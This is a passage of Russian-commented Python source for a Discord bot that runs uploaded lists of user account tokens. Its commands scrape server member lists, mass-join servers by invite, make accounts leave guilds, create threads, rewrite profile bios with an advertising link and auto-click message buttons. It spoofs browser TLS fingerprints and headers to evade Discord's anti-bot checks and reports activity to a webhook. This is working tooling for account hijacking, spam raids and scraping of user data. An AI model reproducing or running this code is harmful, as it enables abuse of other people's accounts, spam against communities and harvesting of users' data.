    console.print(f"[info]ℹ Пользователь {inter.author} вызвал /scraper с параметрами: server_id={server_id}, channel_id={channel_id}[/]")
    send_to_webhook(f'[Команда] Пользователь {inter.author} вызвал /scraper с параметрами: server_id={server_id}, channel_id={channel_id}')
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: файл должен быть текстовым (.txt).")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return

    try:
        file_content = await save_tokens_file(tokens_file, inter.author.name)
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip() and DISCORD_TOKEN_PATTERN.match(token)]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except Exception as e:
        await inter.edit_original_response(content=f"Ошибка при чтении файла: {str(e)}")
        console.print(f"[error]❌ Ошибка при чтении файла: {str(e)}[/]")
        send_to_webhook(f'[Ошибка] Ошибка при чтении файла от {inter.author}: {str(e)}')
        return

    await inter.edit_original_response(content="Проверяю токены...")
    valid_tokens = await validate_tokens(tokens)

    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов для работы.")
        console.print(f"[error]❌ Нет валидных токенов в файле {tokens_file.filename} от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}')
        return

    await inter.edit_original_response(content="Проверяю доступ к каналу...")
    threads = []
    valid_sockets = []
    for token in valid_tokens:
        try:
            sb = DiscordSocket(token, server_id, channel_id)
            if await sb.check_channel_access():
                t = threading.Thread(target=sb.run, daemon=True)
                threads.append((t, sb))
                valid_sockets.append(sb)
                t.start()
                console.print(f"[info]ℹ Запущен поток скрапинга для токена {token[:6]}...[/]")
            else:
                console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа[/]")
                send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа")
        except Exception as e:
            console.print(f"[error]❌ Не удалось запустить скрапинг для токена {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f'[Ошибка] Не удалось запустить скрапинг для токена {token[:6]}...: {str(e)}')
            continue

    if not valid_sockets:
        await inter.edit_original_response(content="Ошибка: у токенов нет доступа к каналу.")
        console.print(f"[error]❌ Скрапинг не выполнен: у токенов нет доступа к каналу {channel_id}[/]")
        send_to_webhook(f"[Ошибка] Скрапинг не выполнен: у токенов нет доступа к каналу {channel_id}")
        return

    await inter.edit_original_response(content="Начинаю скрапинг...")
    console.print(f"[info]ℹ Начинаю скрапинг для сервера {server_id}[/]")
    last_status_update = time.time()
    status_update_interval = 5
    last_console_update = time.time()
    console_update_interval = 30
    prev_count = 0
    is_running = True
    no_progress_count = 0
    max_no_progress = 10

    while is_running and any(t.is_alive() for t, _ in threads):
        try:
            all_members = set()
            for _, sb in threads:
                all_members.update(sb.members.keys())
            total_members = len(all_members)
            
            current_time = time.time()
            
            if current_time - last_status_update >= status_update_interval:
                await inter.edit_original_response(content=f"Скрапинг в процессе... Собрано {total_members} пользователей.")
                last_status_update = current_time
                
                if total_members > prev_count:
                    no_progress_count = 0
                    if current_time - last_console_update >= console_update_interval:
                        console.print(f"[success]✅ Скрапинг прогресс: собрано {total_members} пользователей (+{total_members - prev_count} новых)[/]")
                        last_console_update = current_time
                    prev_count = total_members
                else:
                    no_progress_count += 1
                    if no_progress_count >= max_no_progress:
                        if not any(not sb.endScraping for _, sb in threads):
                            is_running = False
        except Exception as e:
            console.print(f"[error]❌ Ошибка при обновлении статуса: {str(e)}[/]")
            send_to_webhook(f'[Ошибка] Ошибка при обновлении статуса: {str(e)}')
            await asyncio.sleep(1)
            continue
        await asyncio.sleep(1)

    all_members = set()
    for _, sb in threads:
        try:
            all_members.update(sb.members.keys())
        except Exception as e:
            console.print(f"[error]❌ Ошибка при финальном сборе данных для токена: {str(e)}[/]")
            send_to_webhook(f'[Ошибка] Ошибка при финальном сборе данных для токена: {str(e)}')
            continue

    total_members = len(all_members)
    for t, _ in threads:
        try:
            t.join(timeout=3)
        except Exception as e:
            console.print(f"[error]❌ Ошибка при завершении потока: {str(e)}[/]")
            send_to_webhook(f'[Ошибка] Ошибка при завершении потока: {str(e)}')

    await inter.edit_original_response(content=f"Скрапинг завершён! Собрано {total_members} пользователей и сохранено в scrapes/{server_id}/users.txt.")
    console.print(f"[success]✅ Скрапинг завершён: собрано {total_members} пользователей[/]")
    send_to_webhook(f'[Успех] Скрапинг завершён для {inter.author}: собрано {total_members} пользователей')

class Prep:
    def __init__(self):
        self.identifier = 'chrome_131'
        self.sess = tls_client.Session(client_identifier=self.identifier, random_tls_extension_order=True)
        self.headers = {}
        self.initialize_client()

    def initialize_client(self):
        try:
            r = requests.get('https://raw.githubusercontent.com/sadasdas2131/discord-api-main/refs/heads/main/latest.json').json()
            self.xsup = r['chrome133-duckduckgo']['X-Super-Properties']
            self.ua = r['chrome133-duckduckgo']['User-Agent']
            self.reffrer = 'https://discord.gg/nepon'
            self.xtimezone = 'Europe/Warsaw'
            self.cookies_renew()
            self.headers_form()
            console.print("[success]✅ Клиент успешно инициализирован[/]")
        except Exception as e:
            console.print(f"[error]❌ Ошибка инициализации клиента: {e}[/]")
            raise

    def cookies_renew(self):
        try:
            r = self.sess.get('https://discord.com', headers=self.headers)
            cookies_ = r.cookies.get_dict()
            self.cookies = {
                '__dcfduid': cookies_.get('__dcfduid'),
                '__sdcfduid': cookies_.get('__sdcfduid'),
                '_cfuvid': cookies_.get('_cfuvid'),
                'locale': 'en-US',
                '__cfruid': cookies_.get('__cfruid')
            }
            console.print("[success]✅ Cookies успешно обновлены[/]")
        except Exception as e:
            console.print(f"[error]❌ Ошибка обновления cookies: {e}[/]")
            raise

    def headers_form(self):
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,pl;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': self.reffrer,
            'Priority': 'u=1, i',
            'Sec-Ch-Ua': '"Not;A=Brand";v="24", "Chromium";v="131"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': self.ua,
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': self.xtimezone,
            'X-Super-Properties': self.xsup
        }

class Client:
    def __init__(self, token=None):
        prep = Prep()
        self.token = token
        self.sess = tls_client.Session(client_identifier=prep.identifier, random_tls_extension_order=True)
        self.headers = prep.headers
        self.cookies = prep.cookies
class Joiner:
    def __init__(self, tokens, invite, delay):
        self.invite = invite
        self.delay = delay
        self.tokens = tokens
        self.success_count = 0
        self.error_count = 0
        self.captcha_count = 0
        self.lock = threading.Lock()
        self.semaphore = threading.Semaphore(30)

    def join(self, token):
        with self.semaphore:
            try:
                cl = Client(token)
                cl.headers['Authorization'] = token
                session_id = uuid.uuid4().hex
                payload = {'session_id': session_id}
                r = cl.sess.post(
                    f'https://discord.com/api/v9/invites/{self.invite}',
                    headers=cl.headers,
                    cookies=cl.cookies,
                    json=payload
                )
                with self.lock:
                    if r.status_code == 200 or (r.status_code == 403 and 'already_joined' in r.text):
                        self.success_count += 1
                        console.print(f"[success]✅ Успешно зашёл с токеном {token[:6]}...[/]")
                    elif 'captcha_key' in r.text:
                        self.captcha_count += 1
                        console.print(f"[warning]⚠️ Капча для токена {token[:6]}...[/]")
                    else:
                        self.error_count += 1
                        console.print(f"[error]❌ Ошибка входа для токена {token[:6]}...: {r.status_code}[/]")
                        if 'retry_after' in r.text:
                            limit = r.json().get('retry_after', 1.5)
                            console.print(f"[warning]⏳ Rate limit, ждем {limit:.2f} секунд...[/]")
                            time.sleep(float(limit))
                            self.join(token)
                        elif 'Cloudflare' in r.text:
                            console.print(f"[warning]⚠️ Обнаружен Cloudflare, ждем 5 секунд...[/]")
                            time.sleep(5)
                            self.join(token)
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    console.print(f"[error]❌ Исключение при входе для токена {token[:6]}...: {e}[/]")

    def run(self):
        console.print(f"[info]ℹ Начинаю вход на сервер с инвайтом {self.invite}...[/]")
        with ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(self.join, token) for token in self.tokens]
            for future in futures:
                future.result()
                if self.delay > 0:
                    time.sleep(self.delay)
        console.print(f"[success]✅ Вход завершён: {self.success_count} успехов, {self.error_count} ошибок, {self.captcha_count} капч[/]")
        return self.success_count, self.error_count, self.captcha_count
    
class GuildLeaver:
    def __init__(self, tokens, guild_id, delay=0):
        self.tokens = list(set(tokens)) 
        self.guild_id = guild_id
        self.delay = delay
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.semaphore = threading.Semaphore(30)

    def leave_guild(self, token, max_retries=3):
        retries = 0
        while retries < max_retries:
            with self.semaphore:
                try:
                    headers = {"Authorization": token}
                    apilink = f"https://discord.com/api/v9/users/@me/guilds/{self.guild_id}"
                    response = requests.delete(apilink, headers=headers)
                    with self.lock:
                        if response.status_code == 204:
                            self.success_count += 1
                            console.print(f"[success]✅ Успешно вышел с токена {token[:6]}...[/]")
                            return  
                        elif response.status_code == 401: 
                            self.error_count += 1
                            console.print(f"[error]❌ Неверный токен {token[:6]}...: {response.status_code}[/]")
                            return  
                        elif response.status_code == 429:  
                            retries += 1
                            retry_after = float(response.headers.get("Retry-After", 1.5))
                            console.print(f"[warning]⏳ Лимит запросов для токена {token[:6]}..., попытка {retries}/{max_retries}, ждем {retry_after:.2f} секунд...[/]")
                            time.sleep(retry_after)
                            if retries == max_retries:
                                self.error_count += 1
                                console.print(f"[error]❌ Достигнут лимит попыток для токена {token[:6]}...: {response.status_code}[/]")
                                return  
                        else:
                            self.error_count += 1
                            console.print(f"[error]❌ Ошибка выхода для токена {token[:6]}...: {response.status_code}[/]")
                            return 
                except Exception as e:
                    with self.lock:
                        self.error_count += 1
                        console.print(f"[error]❌ Исключение при выходе для токена {token[:6]}...: {e}[/]")
                        return  

    def run(self):
        console.print(f"[info]ℹ Начинаю выход из гильдии {self.guild_id}...[/]")
        with ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(self.leave_guild, token) for token in self.tokens]
            for future in futures:
                future.result()
                if self.delay > 0:
                    time.sleep(self.delay)
        console.print(f"[success]✅ Выход завершён: {self.success_count} успехов, {self.error_count} ошибок[/]")
        return self.success_count, self.error_count

@bot.slash_command(name="joiner", description="Заходит на сервер по приглашению с помощью токенов")
async def joiner(
    inter: disnake.ApplicationCommandInteraction,
    invite: str = disnake_commands.Param(description="Приглашение (например, https://discord.gg/nepon или nepon)"),
    delay: float = disnake_commands.Param(description="Задержка между заходами (0 для без задержки)", default=0, ge=0),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    send_to_webhook(f'[Команда] Пользователь {inter.author} вызвал /joiner с параметрами: invite={invite}')
    await inter.response.defer(ephemeral=True)
    
    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: файл должен быть текстовым (.txt).")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return
    
    console.print(f"[info]ℹ Сохранение файла токенов от {inter.author}...[/]")
    file_content = await save_tokens_file(tokens_file, inter.author.name)
    tokens = file_content.decode('utf-8').splitlines()
    tokens = [token.strip() for token in tokens if token.strip()]
    
    if await check_token_count(tokens, inter, inter.author):
        return
    
    console.print(f"[info]ℹ Проверка токенов...[/]")
    valid_tokens = await validate_tokens(tokens)
    
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов для работы.")
        console.print(f"[error]❌ Нет валидных токенов в файле {tokens_file.filename}[/]")
        send_to_webhook(f'[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}')
        return
    
    invite = invite.replace('https://discord.gg/', '').strip()
    joiner_instance = Joiner(valid_tokens, invite, delay)
    await inter.edit_original_response(content=f"Начинаю заход на сервер https://discord.gg/{invite}...")
    
    success, errors, captcha = await asyncio.get_event_loop().run_in_executor(None, joiner_instance.run)
    result_message = (
        f"Заход на сервер https://discord.gg/{invite} завершён!\n"
        f"✅ Успешно зашли: {success} токенов\n"
        f"❌ Не смогли зайти: {errors} токенов\n"
        f"🔒 Требуется капча: {captcha} токенов"
    )
    await inter.edit_original_response(content=result_message)
    send_to_webhook(f'[Успех] Заход завершён: {success} успехов, {errors} ошибок, {captcha} капч')

@bot.slash_command(name="leaver", description="Выходит из гильдии с помощью токенов")
async def leaver(
    inter: disnake.ApplicationCommandInteraction,
    guild_id: str = disnake_commands.Param(description="ID гильдии"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    send_to_webhook(f'[Команда] Пользователь {inter.author} вызвал /leaver с параметрами: guild_id={guild_id}')
    await inter.response.defer(ephemeral=True)
    
    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: файл должен быть текстовым (.txt).")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return
    
    console.print(f"[info]ℹ Сохранение файла токенов от {inter.author}...[/]")
    file_content = await save_tokens_file(tokens_file, inter.author.name)
    tokens = file_content.decode('utf-8').splitlines()
    tokens = [token.strip() for token in tokens if token.strip()]
    
    if await check_token_count(tokens, inter, inter.author):
        return
    
    console.print(f"[info]ℹ Проверка токенов...[/]")
    valid_tokens = await validate_tokens(tokens)
    
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов для работы.")
        console.print(f"[error]❌ Нет валидных токенов в файле {tokens_file.filename}[/]")
        send_to_webhook(f'[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}')
        return
    
    leaver_instance = GuildLeaver(valid_tokens, guild_id)
    await inter.edit_original_response(content=f"Начинаю выход из гильдии {guild_id}...")
    
    success, errors = await asyncio.get_event_loop().run_in_executor(None, leaver_instance.run)
    result_message = (
        f"Выход из гильдии {guild_id} завершён!\n"
        f"✅ Успешно вышли: {success} токенов\n"
        f"❌ Не смогли выйти: {errors} токенов"
    )
    await inter.edit_original_response(content=result_message)
    send_to_webhook(f'[Успех] Выход завершён: {success} успехов, {errors} ошибок')

@bot.slash_command(name="threadcreator", description="Создаёт ветки в канале (макс. 10 тредов на токен)")
async def threadcreator(
    inter: disnake.ApplicationCommandInteraction,
    channel_id: str = disnake_commands.Param(description="ID канала"),
    name: str = disnake_commands.Param(description="Название веток"),
    total_threads: int = disnake_commands.Param(description="Количество веток (от 1 до 10)", ge=1),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: нужен .txt файл")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f"[Ошибка] Неверный формат файла от {inter.author}: нужен .txt")
        return

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f"[Ошибка] Ошибка декодирования файла от {inter.author}")
        return

    if not tokens:
        await inter.edit_original_response(content="Ошибка: Файл пустой, нет токенов для проверки.")
        console.print(f"[error]❌ Файл пустой[/]")
        send_to_webhook(f"[Ошибка] Файл пустой от {inter.author}")
        return

    valid_tokens = await validate_tokens(tokens)
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f"[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}")
        return

    await inter.edit_original_response(content="Проверяю доступ к каналу...")
    thread_creator = DiscordThreadCreator(valid_tokens, channel_id, name, total_threads, inter)
    valid_tokens_with_access = await thread_creator.check_channel_access()
    
    if not valid_tokens_with_access:
        await inter.edit_original_response(content="Ошибка: у токенов нет доступа к каналу.")
        console.print(f"[error]❌ Создание веток не выполнено: у токенов нет доступа к каналу {channel_id}[/]")
        send_to_webhook(f"[Ошибка] Создание веток не выполнено: у токенов нет доступа к каналу {channel_id}")
        return

    created, errors = await thread_creator.run()
    await inter.edit_original_response(content=f"Создание веток завершено!\n✅ Создано: {created}/{total_threads}\n❌ Ошибок: {errors}")
    console.print(f"[success]✅ Команда /threadcreator завершена для {inter.author}[/]")
    send_to_webhook(f"[Успех] Команда /threadcreator для {inter.author}: {created} создано, {errors} ошибок")

class BioChanger:
    def __init__(self, tokens, bio, inter):
        self.tokens = tokens
        self.bio = bio
        self.inter = inter
        self.success_count = 0
        self.error_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.available_tokens = tokens.copy()
        self.prep = Prep()
        self.session = tls_client.Session(client_identifier='chrome_131', random_tls_extension_order=True)

    async def update_status(self):
        while self.is_running:
            with self.lock:
                message = (
                    f"Изменение биографии...\n"
                    f"✅ Успешно: {self.success_count}\n"
                    f"❌ Ошибок: {self.error_count}\n"
                    f"📊 Обработано токенов: {self.total_processed}/{len(self.tokens)}"
                )
            try:
                await self.inter.edit_original_response(content=message)
            except Exception as e:
                console.print(f"[error]❌ Ошибка обновления статуса: {e}[/]")
            await asyncio.sleep(2)

    async def change_bio(self, token):
        headers = self.prep.headers.copy()
        headers['Authorization'] = token
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Encoding'] = 'gzip, deflate, br'  
        payload = {"bio": self.bio if self.bio.strip() else "discord.gg/nepon"}
        async with limiter:
            try:
                response = await request(
                    method="PATCH",
                    url="https://discord.com/api/v9/users/@me/profile",
                    payload=payload,
                    headers=headers,
                    timeout=5,
                    retries=3
                )
            except Exception as e:
                response = None
                console.print(f"[error]❌ Исключение при запросе для токена {token[:6]}...: {e}[/]")
        with self.lock:
            self.total_processed += 1
            if response and isinstance(response, dict) and response.get('id'):
                self.success_count += 1
                console.print(f"[success]✅ Биография изменена для токена {token[:6]}...[/]")
                send_to_webhook(f"[Успех] Биография изменена для токена {token[:6]}...")
            else:
                self.error_count += 1
                reason = "Unknown"
                if response is None:
                    reason = "Request failed after retries"
                elif isinstance(response, dict):
                    code = response.get('code', 0)
                    if code == 401:
                        reason = "Unauthorized token"
                    elif code == 403:
                        reason = "Insufficient permissions"
                    elif code == 429:
                        reason = "Rate limit exceeded"
                    elif code == 400:
                        reason = response.get('message', "Invalid bio")
                console.print(f"[error]❌ Ошибка изменения биографии токеном {token[:6]}... | Причина: {reason}[/]")
                send_to_webhook(f"[Ошибка] Ошибка изменения биографии токеном {token[:6]}... | Причина: {reason}")
                log_error(token, f"bio_change: {reason}")
                if reason in ["Unauthorized token", "Insufficient permissions", "Invalid bio"]:
                    self.available_tokens.remove(token)

    async def run(self):
        status_task = asyncio.create_task(self.update_status())
        try:
            batch_size = 10
            for i in range(0, len(self.available_tokens), batch_size):
                if not self.is_running:
                    break
                batch = self.available_tokens[i:i + batch_size]
                tasks = [self.change_bio(token) for token in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for token, result in zip(batch, results):
                    if isinstance(result, Exception):
                        self.error_count += 1
                        console.print(f"[error]❌ Исключение при изменении биографии токеном {token[:6]}...: {result}[/]")
                        send_to_webhook(f"[Ошибка] Исключение при изменении биографии токеном {token[:6]}...: {result}")
                        log_error(token, f"bio_change: {str(result)}")
                        self.available_tokens.remove(token)
                await asyncio.sleep(0.2)
        finally:
            self.session.close()
            self.is_running = False
            await status_task
        console.print(f"[success]✅ Изменение биографии завершено: {self.success_count} успешно, {self.error_count} ошибок[/]")
        send_to_webhook(f"[Успех] Изменение биографии для {self.inter.author}: {self.success_count} успешно, {self.error_count} ошибок")
        return self.success_count, self.error_count

@bot.slash_command(name="biochanger", description="Изменить биографию токенов")
async def biochanger(
    inter: disnake.ApplicationCommandInteraction,
    bio: str = disnake_commands.Param(description="Новая биография"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: нужен .txt файл")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f"[Ошибка] Неверный формат файла от {inter.author}: нужен .txt")
        return

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f"[Ошибка] Ошибка декодирования файла от {inter.author}")
        return

    if not tokens:
        await inter.edit_original_response(content="Ошибка: Файл пустой, нет токенов для проверки.")
        console.print(f"[error]❌ Файл пустой[/]")
        send_to_webhook(f"[Ошибка] Файл пустой от {inter.author}")
        return

    valid_tokens = await validate_tokens(tokens)
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f"[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}")
        return

    bio_changer = BioChanger(valid_tokens, bio, inter)
    success, errors = await bio_changer.run()
    await inter.edit_original_response(content=f"Изменение биографии завершено!")
    console.print(f"[success]✅ Команда /biochanger завершена для {inter.author}[/]")
    send_to_webhook(f"[Успех] Команда /biochanger для {inter.author}: {success} успешно, {errors} ошибок")

@bot.slash_command(
    name="button_clicker",
    description="Кликает на кнопку в указанном сообщении"
)
async def component_clicker(
    inter: disnake.ApplicationCommandInteraction,
    server_id: str = disnake_commands.Param(description="ID сервера, где находится канал"),
    channel_id: str = disnake_commands.Param(description="ID канала, где находится сообщение"),
    message_id: str = disnake_commands.Param(description="ID сообщения с кнопкой"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Файл с токенами (txt, каждый токен в новой строке)")
):
    if await check_protected_guild(inter):
        return

    await inter.response.send_message("Начинаю обработку токенов и клик по кнопке...", ephemeral=True)

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    tokens = file_content.decode('utf-8').splitlines()
    tokens = [token.strip() for token in tokens if token.strip() and DISCORD_TOKEN_PATTERN.match(token.strip())]

    if not tokens:
        await inter.followup.send("Файл пуст или не содержит валидных токенов.", ephemeral=True)
        return

    if await check_token_count(tokens, inter, inter.author):
        await inter.followup.send("Превышен лимит токенов (максимум 500).", ephemeral=True)
        return

    valid_tokens = await validate_tokens(tokens)
    if not valid_tokens:
        await inter.followup.send("Нет валидных токенов для обработки.", ephemeral=True)
        return
    
    rate_limiter = AsyncLimiter(30, 1)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    xsup = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJvc3MiOiJ3aW5kb3dzIiwiYnJvd3NlciI6ImNocm9tZSIsInZlcnNpb24iOiIxMjAiLCJkZXZpY2UiOiJkZXNrdG9wIiwidGltZXpvbmUiOiJFdXJvcGUvQmVybGluIn0."

    def get_cookies():
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,pl;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'User-Agent': ua,
            'X-Super-Properties': xsup
        }
        r = requests.get('https://discord.com', headers=headers)
        cookies_ = r.cookies.get_dict()
        return {
            '__dcfduid': cookies_.get('__dcfduid'),
            '__sdcfduid': cookies_.get('__sdcfduid'),
            '_cfuvid': cookies_.get('_cfuvid'),
            'locale': 'en-US',
            '__cfruid': cookies_.get('__cfruid')
        }

    def build(token=None):
        sess = tls_client.Session(
            client_identifier='chrome_120',
            random_tls_extension_order=True,
        )
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,pl;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Priority': 'u=1, i',
            'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': ua,
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'Europe/Berlin',
            'X-Super-Properties': xsup
        }
        if token:
            headers['Authorization'] = token
        return sess, get_cookies(), headers

    async def check_token_access(token: str, channel_id: str):
        sess, cookies, headers = build(token)
        async with rate_limiter:
            r = sess.get(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers, cookies=cookies)
            if r.status_code != 200:
                return False, f"Нет доступа к каналу: {r.text}"
            return True, "Доступ есть"

    async def get_message(channel_id: str, message_id: str, token: str):
        sess, cookies, headers = build(token)
        async with rate_limiter:
            r = sess.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}", headers=headers, cookies=cookies)
            if r.status_code != 200:
                console.print(f"[error]❌ Ошибка получения сообщения для токена {token[:6]}...: {r.text}[/]")
                send_to_webhook(f"[Ошибка] Не удалось получить сообщение для токена {token[:6]}...: {r.status_code}")
                return None
            messages = r.json()
            return messages[0] if messages else None

    async def get_application_id(channel_id: str, message_id: str, token: str):
        message = await get_message(channel_id, message_id, token)
        if not message:
            return None
        return message.get('application_id')

    def generate_session_id():
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32))

    async def click_button(token: str, channel_id: str, message_id: str, server_id: str, custom_id: str, row_index: int, button_index: int):
        has_access, access_message = await check_token_access(token, channel_id)
        if not has_access:
            console.print(f"[error]❌ Токен {token[:6]}... не имеет доступа к каналу: {access_message}[/]")
            send_to_webhook(f"[Ошибка] Токен {token[:6]}... не имеет доступа к каналу: {access_message}")
            return False

        application_id = await get_application_id(channel_id, message_id, token)
        if not application_id:
            console.print(f"[error]❌ Не удалось получить application_id для токена {token[:6]}...[/]")
            return False

        sess, cookies, headers = build(token)
        
        session_id = generate_session_id()
        
        payload = {
            "type": 3,
            "guild_id": server_id,
            "channel_id": channel_id,
            "message_id": message_id,
            "application_id": application_id,
            "session_id": session_id,  
            "data": {
                "component_type": 2,
                "custom_id": custom_id
            }
        }

        async with rate_limiter:
            r = sess.post(
                "https://discord.com/api/v9/interactions",
                json=payload,
                headers=headers,
                cookies=cookies
            )
            if r.status_code in [200, 204]:
                console.print(f"[success]✅ Токен {token[:6]}... успешно кликнул на кнопку {custom_id}[/]")
                send_to_webhook(f"[Успех] Токен {token[:6]}... кликнул на кнопку {custom_id}")
                return True
            else:
                console.print(f"[error]❌ Ошибка клика для токена {token[:6]}...: {r.status_code} {r.text}[/]")
                send_to_webhook(f"[Ошибка] Токен {token[:6]}... не смог кликнуть: {r.status_code} {r.text}")
                log_error(token, "click")
                return False
    
    first_token = valid_tokens[0]
    message = await get_message(channel_id, message_id, first_token)
    if not message:
        await inter.followup.send("Не удалось получить сообщение с кнопками.", ephemeral=True)
        return
    
    components = message.get('components', [])
    if not components:
        await inter.followup.send("В сообщении нет компонентов (кнопок).", ephemeral=True)
        return
    
    available_buttons = []
    for row_index, row in enumerate(components):
        for btn_index, btn in enumerate(row.get('components', [])):
            if btn.get('type') == 2: 
                label = btn.get('label', '')
                emoji = btn.get('emoji', None)
                emoji_str = ""
                
                if emoji:
                    if emoji.get('id'):
                        emoji_name = emoji.get('name', '')
                        emoji_id = emoji.get('id', '')
                        emoji_animated = emoji.get('animated', False)
                        prefix = 'a' if emoji_animated else ''
                        emoji_str = f"<{prefix}:{emoji_name}:{emoji_id}>"
                    else:
                        emoji_str = emoji.get('name', '')
                
                display_name = f"{emoji_str} {label}" if emoji_str and label else emoji_str or label or 'Без названия'
                
                custom_id = btn.get('custom_id', '')
                if custom_id:
                    available_buttons.append({
                        'label': label,
                        'emoji': emoji_str,
                        'display_name': display_name,
                        'custom_id': custom_id,
                        'row': row_index,
                        'index': btn_index
                    })
    
    if not available_buttons:
        await inter.followup.send("В сообщении нет кнопок.", ephemeral=True)
        return
    
    if len(available_buttons) == 1:
        button_info = available_buttons[0]
        selected_row = button_info['row']
        selected_index = button_info['index']
        selected_custom_id = button_info['custom_id']
        await inter.followup.send(f"Найдена одна кнопка: {button_info['display_name']}. Начинаю клик...", ephemeral=True)
    else:
        embed = disnake.Embed(
            title="🔘 Доступные кнопки в сообщении",
            description=f"Найдено {len(available_buttons)} кнопок\nВыберите кнопку для клика из списка ниже:",
            color=disnake.Color.blue()
        )
        
        options = []
        for i, btn in enumerate(available_buttons):
            options.append(disnake.SelectOption(
                label=btn['label'][:25] if btn['label'] else f"Кнопка {i+1}", 
                value=str(i),
